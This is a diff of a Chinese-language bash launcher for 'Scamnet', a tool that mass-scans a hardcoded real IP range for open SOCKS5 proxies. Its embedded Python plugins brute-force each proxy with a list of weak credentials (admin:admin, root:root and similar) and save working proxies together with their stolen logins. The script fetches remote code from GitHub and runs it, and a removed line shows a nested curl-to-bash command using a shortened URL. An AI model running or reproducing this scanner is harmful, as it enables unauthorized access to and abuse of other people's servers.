@@ -1,8 +1,11 @@
 #!/bin/bash
-# main.sh - Scamnet OTC SOCKS5 扫描器（自包含版）
-# 包含 requirements.txt 内容，无需外部文件
-# 作者: avotcorg | TG: @soqunla
-# 仓库: https://github.com/avotcorg/scamnet
+# main.sh - Scamnet OTC SOCKS5 扫描器（完整自包含版）
+# 包含：
+#   • 内嵌 requirements.txt
+#   • 自动创建所有插件
+#   • 使用 config.yaml 中 157.254.32.0-157.254.52.255 范围
+#   • 一键启动
+# TG: @soqunla | GitHub: https://github.com/avotcorg/scamnet
 
 set -e
 
@@ -12,7 +15,7 @@ LOG_DIR="logs"; mkdir -p "$LOG_DIR"
 LOG="$LOG_DIR/scanner_$(date +%Y%m%d_%H%M%S).log"
 
 log() { echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG"; }
-echo -e "${GREEN}[OTC] Scamnet 自包含启动器 v1.0${NC}"
+echo -e "${GREEN}[OTC] Scamnet 完整启动器 v2.0 (157.254.32.0-157.254.52.255)${NC}"
 echo "日志 → $LOG"
 
 # ==================== 内嵌 requirements.txt ====================
@@ -23,7 +26,7 @@ PyYAML>=6.0
 ipaddress>=1.0.23
 "
 
-# ==================== 检查 & 安装依赖（国内镜像）================
+# ==================== 安装依赖（国内镜像）================
 if [ ! -f ".deps_installed" ]; then
     echo -e "${YELLOW}[*] 安装依赖（清华源）...${NC}"
     echo "$REQUIREMENTS_CONTENT" > /tmp/scamnet_reqs.txt
@@ -33,50 +36,223 @@ if [ ! -f ".deps_installed" ]; then
     touch .deps_installed
     log "依赖安装完成"
 else
-    log "依赖已安装，跳过"
+    log "依赖已安装"
 fi
 
-# ==================== 下载核心文件 ====================
-download() {
-    local url="$1" file="$2"
-    curl -Ls --fail --retry 3 --create-dirs -o "$file" "$url" || {
-        echo -e "${RED}[!] 下载失败: $file${NC}" >&2
-        exit 1
-    }
+# ==================== 下载/创建文件函数 ====================
+download_or_create() {
+    local url="$1" file="$2" content="$3"
+    if curl -Ls --fail --retry 3 -o "$file" "$url" 2>/dev/null; then
+        log "下载成功: $file"
+    else
+        echo -e "${YELLOW}[*] 下载失败，创建内嵌版: $file${NC}"
+        echo "$content" > "$file"
+        log "创建内嵌: $file"
+    fi
 }
 
-echo -e "${YELLOW}[*] 下载 scanner.py 和插件...${NC}"
-download "https://raw.githubusercontent.com/avotcorg/scamnet/main/scanner.py" "scanner.py"
-mkdir -p plugins
-download "https://raw.githubusercontent.com/avotcorg/scamnet/main/plugins/__init__.py" "plugins/__init__.py"
-download "https://raw.githubusercontent.com/avotcorg/scamnet/main/plugins/auth_weak.py" "plugins/auth_weak.py"
-download "https://raw.githubusercontent.com/avotcorg/scamnet/main/plugins/geo_ipapi.py" "plugins/geo_ipapi.py"
-download "https://raw.githubusercontent.com/avotcorg/scamnet/main/plugins/output_file.py" "plugins/output_file.py"
-
-# ==================== 创建默认配置 ====================
+# ==================== 创建 config.yaml（你提供的范围）================
 cat > config.yaml << 'EOF'
 # Scamnet 配置
-range: "157.254.32.0-157.254.32.255"
-ports: [1080, 8080, 3128, 8000, 8081, 5555, 8888, 4890, 20000, 40000, 8081]
+range: "157.254.32.0-157.254.52.255"
+ports:
+  - 1080
+  - 8080
 timeout: 6.0
 workers: 300
 EOF
-log "config.yaml 创建"
+log "config.yaml 已创建（157.254.32.0-157.254.52.255）"
+
+# ==================== 下载 scanner.py（优先仓库）================
+download_or_create "https://raw.githubusercontent.com/avotcorg/scamnet/main/scanner.py" "scanner.py" "
+# scanner.py - 精简兼容版（插件化）
+import sys, os
+sys.path.append(os.path.dirname(__file__))
+from plugins import load_plugins
+from concurrent.futures import ThreadPoolExecutor
+import socket, ipaddress, threading, time, yaml
+from tqdm import tqdm
+
+# 加载配置
+with open('config.yaml') as f:
+    cfg = yaml.safe_load(f)
+
+INPUT_RANGE = cfg['range']
+PORTS = cfg['ports']
+TIMEOUT = cfg.get('timeout', 6.0)
+MAX_WORKERS = cfg.get('workers', 300)
+
+# 全局
+file_lock = threading.Lock()
+valid_count = 0
+plugins = load_plugins()
+
+def test_proxy(ip: str, port: int):
+    global valid_count
+    result = {'ip':ip, 'port':port, 'status':'FAIL', 'country':'XX', 'latency':'-', 'export_ip':'-', 'auth':''}
+
+    ok, latency, export_ip = is_socks5_available(ip, port, None, None)
+    if ok:
+        country = get_country(export_ip) or get_country(ip)
+        result.update({'status':'OK', 'country':country, 'latency':f'{latency}ms', 'export_ip':export_ip})
+    else:
+        auth = plugins['auth_weak'].brute(ip, port) if 'auth_weak' in plugins else None
+        if auth:
+            user, pwd = auth
+            ok, latency, export_ip = is_socks5_available(ip, port, user, pwd)
+            if ok:
+                country = get_country(export_ip) or get_country(ip)
+                result.update({'status':'OK (Weak)', 'country':country, 'latency':f'{latency}ms', 'export_ip':export_ip, 'auth':f'{user}:{pwd}'})
+
+    plugins['output_file'].save_detail(result)
+    if result['status'].startswith('OK'):
+        valid_count += 1
+        plugins['output_file'].save_valid(result)
+
+def get_country(ip):
+    for name in ['geo_ipapi']:
+        if name in plugins and (c := plugins[name].get(ip)):
+            return c
+    return 'XX'
+
+def is_socks5_available(ip, port, user, pwd):
+    try:
+        with socket.create_connection((ip, port), timeout=TIMEOUT) as sock:
+            sock.settimeout(TIMEOUT)
+            methods = b'\\x05\\x02\\x00\\x02' if user and pwd else b'\\x05\\x01\\x00'
+            sock.sendall(methods)
+            resp = sock.recv(2)
+            if len(resp) != 2 or resp[0] != 5: return False,0,None
+            method = resp[1]
+            if method == 0: pass
+            elif method == 2 and user and pwd:
+                auth = b'\\x01' + bytes([len(user)]) + user.encode() + bytes([len(pwd)]) + pwd.encode()
+                sock.sendall(auth)
+                if sock.recv(2)[1] != 0: return False,0,None
+            else: return False,0,None
+
+            target = socket.inet_aton(socket.gethostbyname('ifconfig.me')) + b'\\x00\\x50'
+            sock.sendall(b'\\x05\\x01\\x00\\x01' + target)
+            if sock.recv(10)[1] != 0: return False,0,None
+
+            sock.sendall(b'GET / HTTP/1.1\\r\\nHost: ifconfig.me\\r\\n\\r\\n')
+            resp = b''
+            start = time.time()
+            while time.time() - start < TIMEOUT:
+                try:
+                    chunk = sock.recv(1024)
+                    if not chunk: break
+                    resp += chunk
+                    if b'\\r\\n\\r\\n' in resp: break
+                except: break
+            export_ip = resp.split(b'\\r\\n\\r\\n',1)[1].decode(errors='ignore').split()[0] if b'\\r\\n\\r\\n' in resp else 'Unknown'
+            return True, round((time.time()-start)*1000), export_ip
+    except: return False,0,None
+
+def main():
+    print('[OTC] 扫描启动')
+    ips = [str(ip) for ip in ipaddress.ip_network(INPUT_RANGE, strict=False).hosts()] if '/' in INPUT_RANGE else \
+          [str(ipaddress.IPv4Address(i)) for i in range(int(ipaddress.IPv4Address(INPUT_RANGE.split('-')[0])), int(ipaddress.IPv4Address(INPUT_RANGE.split('-')[1]))+1)]
+    total = len(ips) * len(PORTS)
+    print(f'IP: {len(ips):,}, 端口: {len(PORTS)}, 总任务: {total:,}')
+    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as exe:
+        pbar = tqdm(total=total, desc='扫描', unit='port')
+        for ip in ips:
+            for port in PORTS:
+                exe.submit(test_proxy, ip, port)
+                pbar.update(1)
+        pbar.close()
+    print(f'\\n[+] 完成！发现 {valid_count} 个可用代理')
+
+if __name__ == '__main__': main()
+"
+
+# ==================== 创建 plugins 目录 & 插件 ====================
+mkdir -p plugins
+
+# __init__.py
+cat > plugins/__init__.py << 'EOF'
+import importlib, os
+def load_plugins():
+    plugins = {}
+    path = os.path.dirname(__file__)
+    for file in os.listdir(path):
+        if file.endswith('.py') and file not in ['__init__.py']:
+            name = file[:-3]
+            module = importlib.import_module(f'plugins.{name}')
+            plugins[name] = module
+    return plugins
+EOF
+
+# auth_weak.py
+cat > plugins/auth_weak.py << 'EOF'
+WEAK_PASSWORDS = [
+        "123:123", "111:111", "1:1", "qwe123:qwe123", "abc:abc", "aaa:aaa",
+    "1234:1234", "admin:admin", "socks5:socks5", "123456:123456",
+    "12345678:12345678", "admin123:admin", "proxy:proxy", "admin:123456", "root:root",
+    "12345:12345", "test:test", "user:user", "guest:guest", "admin:", "888888:888888", 
+  "test123:test123", "qwe:qwe", "qwer:qwer", "qwer:qwer", "11:11", "222:222", "2:2", "3:3",
+  "12349:12349", "12349:12349", "user:123", "user:1234", "user:12345", "user:123456"
+]
+def brute(ip: str, port: int):
+    from scanner import is_socks5_available, TIMEOUT
+    for pair in WEAK_PASSWORDS:
+        u,p = pair.split(':')
+        ok,_,_ = is_socks5_available(ip,port,u,p)
+        if ok: return u,p
+    return None
+EOF
+
+# geo_ipapi.py
+cat > plugins/geo_ipapi.py << 'EOF'
+import requests
+def get(ip: str):
+    try:
+        r = requests.get(f'http://ip-api.com/json/{ip}?fields=countryCode', timeout=6)
+        if r.status_code == 200:
+            code = r.json().get('countryCode','').strip().upper()
+            if len(code)==2 and code.isalpha():
+                print(f'[GEO] {ip} → {code}')
+                return code
+    except: pass
+    return None
+EOF
+
+# output_file.py
+cat > plugins/output_file.py << 'EOF'
+import threading
+file_lock = threading.Lock()
+valid_count = 0
+def save_detail(r):
+    line = f'{r["ip"]}:{r["port"]} | {r["status"]} | {r["country"]} | {r["latency"]} | {r["export_ip"]} | {r["auth"]}'
+    with file_lock:
+        with open('result_detail.txt','a',encoding='utf-8') as f: f.write(line+'\\n')
+def save_valid(r):
+    global valid_count
+    valid_count += 1
+    auth = r["auth"]
+    fmt = f'socks5://{auth}@{r["ip"]}:{r["port"]}#{r["country"]}' if auth else f'socks5://{r["ip"]}:{r["port"]}#{r["country"]}'
+    with file_lock:
+        with open('socks5_valid.txt','a',encoding='utf-8') as f: f.write(fmt+'\\n')
+    print(f'[+] 发现 #{valid_count}: {fmt}')
+EOF
+
+log "所有插件已创建"
 
 # ==================== 初始化结果文件 ====================
-echo "# Scamnet SOCKS5 扫描详细日志 ($(date))" > result_detail.txt
-echo "# 可用 SOCKS5 代理 (socks5://user:pass@ip:port#Country)" > socks5_valid.txt
+echo "# Scamnet 扫描日志 $(date)" > result_detail.txt
+echo "# socks5://user:pass@ip:port#CN" > socks5_valid.txt
 log "结果文件初始化"
 
 # ==================== 启动扫描 ====================
-echo -e "${GREEN}[*] 启动扫描任务...${NC}"
+echo -e "${GREEN}[*] 启动扫描 (157.254.32.0-157.254.52.255)...${NC}"
 python3 scanner.py 2>&1 | tee -a "$LOG"
 
 # ==================== 完成报告 ====================
-VALID_COUNT=$(grep -c "^socks5://" socks5_valid.txt 2>/dev/null || echo 0)
-echo -e "${GREEN}[+] 扫描完成！发现 ${VALID_COUNT} 个可用代理${NC}"
-echo "   详细日志 → result_detail.txt"
-echo "   有效代理 → socks5_valid.txt"
-log "扫描结束: $VALID_COUNT 个有效代理"
+VALID=$(grep -c "^socks5://" socks5_valid.txt || echo 0)
+echo -e "${GREEN}[+] 扫描完成！发现 ${VALID} 个可用 SOCKS5${NC}"
+echo "   详细 → result_detail.txt"
+echo "   有效 → socks5_valid.txt"
+log "扫描结束: $VALID 个代理"
 
-echo -e "${GREEN}[*] 全部完成！再次运行: bash <(curl -Ls $(curl -Ls https://bit.ly/scamnet-sh))${NC}"
+echo -e "${GREEN}[*] 全部完成！再次运行: ./main.sh${NC}"
